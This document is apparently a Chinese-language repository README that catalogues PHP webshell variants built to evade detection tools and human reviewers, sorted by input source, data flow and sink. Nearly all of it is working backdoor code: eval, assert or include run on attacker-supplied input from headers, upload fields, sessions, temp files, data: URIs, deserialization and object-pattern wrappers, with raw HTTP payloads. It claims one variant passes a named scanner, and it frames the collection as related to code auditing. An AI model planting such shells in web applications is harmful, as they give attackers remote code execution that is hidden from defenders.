# 前言
此项目虽然是免杀shell，但跟代码审计密切相关，有些免杀方法就是真实漏洞的一部分简化，故打算长期沉淀，把自己看到、想到的更新在此。

大概如下四部分：

1、source

2、数据流

3、sink

4、面向人的免杀

这里有的一提的是面向人的免杀，检测工具易过，但是人一看就看得出来。所以也是要免杀人的。

# source

## 直接从变量获取

#### $_SERVER
```php
GET /shell/xx.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 2
code: phpinfo();
Connection: close
```

```php
<?php
eval($_SERVER['HTTP_CODE']);
```


#### $_FILES Content-Type
```
POST /shell/xx.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 180
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjm8AolGAXiYuOHE9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundaryjm8AolGAXiYuOHE9
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: phpinfo()

11
------WebKitFormBoundaryjm8AolGAXiYuOHE9--

```

```php
<?php
assert($_FILES['file']['type']);
```

#### GLOBALS
```php
<?php
eval($GLOBALS[_POST][code]);
```

## 通过函数获取

#### get_defined_vars
通过end(get_defined_vars()[_POST])获取

```php
assert(end(get_defined_vars()[_POST]));
<?php if($_SERVER[123]){eval(end(get_defined_vars()[_POST]));};?>
```

#### next $GLOBALS
```php
<?php
@$GLOBALS{next} = $GLOBALS[$GLOBALS[func] = current($GLOBALS)[GLOBALS]] = $GLOBALS[$GLOBALS[code] = next($GLOBALS)[GLOBALS]] = $GLOBALS[$GLOBALS{func}($GLOBALS{code})];
?>
```

### mysqli_connect
还有
smb \\127.0.0.1\1.txt
ftp
等等各种获取
```php
--
-- 表的结构 `code`
--

CREATE TABLE IF NOT EXISTS `code` (
  `code` varchar(255) COLLATE utf8mb4_bin NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

--
-- 转存表中的数据 `code`
--

INSERT INTO `code` (`code`) VALUES
('phpinfo();');
```

```php
<?php
eval(mysqli_fetch_assoc(mysqli_query(mysqli_connect('127.0.0.1','root','root','shell'),'select * from code'))['code']);
```

#### file_get_contents
```php
<?php
eval(file_get_contents("http://127.0.0.1/1.txt"));
?>
```

#### php://input
需要开启allow_url_include
```php
eval("php://input");
```

#### file_put_contents文件
```php
<?php
file_put_contents("shell.txt",$_POST[1]);
$code = file_get_contents("shell.txt");
eval($code);
```

#### data:text协议
```php
include "data:text/plain,<?php $_POST[1];?>";
```

d盾0级
```php
<?php
include "data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+.php";
```

#### session
```php
<?php
session_id('shell');
session_start();
$_SESSION["username"]="<?php ".$_POST[1]."?>";
session_write_close();

include session_save_path().'/sess_shell';
```

#### session_id
```php
GET /shell/xx.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 0
Connection: close
Cookie: PHPSESSID=706870696e666f28293b


<?php
session_start();
eval(hex2bin(session_id()));
?>
```

#### tmp_file
```php
<?php
$temp = tmpfile();
print_r($temp);
fwrite($temp, $_POST[1]);
rewind($temp);

//phpD722.tmp
eval(fread($temp,100));
```

#### $_FILES['file']['tmp_name']
sys_get_temp_dir()
```php
<?php
$filename = $_FILES['file']['tmp_name'];
include $filename;
```

#### upload_progress
需要条件竞争，php脚本无权限设置cleanup为0
```php
POST /shell/xx.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 64016
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOAAgdsu072sFLxAt
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=test
Connection: close

------WebKitFormBoundaryOAAgdsu072sFLxAt
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php phpinfo();?>
------WebKitFormBoundaryOAAgdsu072sFLxAt
Content-Disposition: form-data; name="file1"; filename="lufei.txt"
Content-Type: application/x-zip-compressed

33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
------WebKitFormBoundaryOAAgdsu072sFLxAt--
```

```php
<?php
include session_save_path().'/sess_test';
```
## 语法

#### 三目运算
```php
<?php
eval(false ? 1 : $_POST[1]);
?>
```

# 数据流

#### uaf
php 5.6测试成功。
```php
<?php
$code = $_POST[1];
$serialized_string = 'a:1:{i:1;C:11:"ArrayObject":37:{x:i:0;a:2:{i:1;R:4;i:2;r:1;};m:a:0:{}}}';
$outer_array = unserialize($serialized_string);
gc_collect_cycles();
$filler1 = "aaaa";
$filler2 = &$code;

eval($outer_array);
?>
```

#### 非等号赋值-数组传递
```php
<?php
$c = array();
array_push($c,$_POST[1]);
eval($c[0]);
?>
```

#### 变量覆盖-parse_str
```php
<?php
parse_str("code=$_POST[1]");
eval($code);
?>
```

#### 变量覆盖-双$
```php
<?php
foreach ($_POST as $key => $value) {
    ${$key} = $value;
}

eval($code);
?>
```


#### 变量覆盖-extract
```php
<?
extract($_GET).$a($b);
```

#### unserialize
```php
<?php
$code=$_POST[1];
$s=base64_decode('YToyOntpOjE7czo2OiJhc3NlcnQiO2k6MjtzOjEwOiJwaHBpbmZvKCk7Ijt9');
$o = unserialize($s);
$o[1]($code);
?>

```

#### pop链
```php
<?php

class Wrapper{
	public $evil;

	function __destruct() {
		$evil = new Evil();
		$evil->func = $_GET['func'];
		$evil->code = $_POST[1];
		$evil."11";
	}
}

Class Evil{
	public $func;
    public $code;

    function __toString() {
        call_user_func($this->func,$this->code);
		return "";
    }
}

$warpper = new Wrapper();
?>
```

#### 回调函数
https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html
```php
$e = $_REQUEST['e'];
$arr = array($_POST[1],);
array_filter($arr, $e);
```

#### trait
```php
trait Evilable {
	public function test($code){
		eval($code);
	}
}

class Legal{
	use Evilable;
}

$evil = new Legal();
$evil->test($_POST[1]);
```

数据源来于类属性
```php
trait Evilable {
	public $code;
	public function test(){
		eval($this->code);
	}
}

class Legal{
	use Evilable;
}


$evil = new Legal();
$evil->code = $_POST[1];
$evil->test($evil->code);
```

#### 自定义路由-工厂模式
```php
<?php
class Evil {
	public $code;
	public function test(){
		eval($this->code);
	}
}

class ClassFactory {
   public function getObject($className){
      return new $className;
   }
}

$classFactory = new ClassFactory();
$evil = $classFactory->getObject("Evil");
$evil->code = $_POST[1];
$evil->test();
?>
```

#### 自定义路由-责任链
```php
<?php

class Chain{
	public $level;
	public $next;

	public function doChain($level,$nothing){
		if($this->level==$level){
			$this->doit($nothing);
		}
		if($this->next!=null){
			$this->next->doChain($level,$nothing);
		}
   }

	public function doit($nothing){
	}
}

class Legal extends Chain{
	public function __construct(){
		$this->level=1;
	}

	public function doit($nothing){
		echo $code;
	}
}

class Evil extends Chain{
	public $code;

	public function __construct(){
		$this->level=2;
	}

	public function doit($nothing){
		eval($this->code);
	}
}

$legal = new Legal();
$evil = new Evil();
$legal->next = $evil;
$evil->next = null;

$evil->code = $_POST[1];
$legal->doChain(2,"");
?>
```

# 参考
SkyBlue永恒、新仙剑之鸣、anlfi、mochazz、yzddMr6s、JamVayne
等发过的文章。
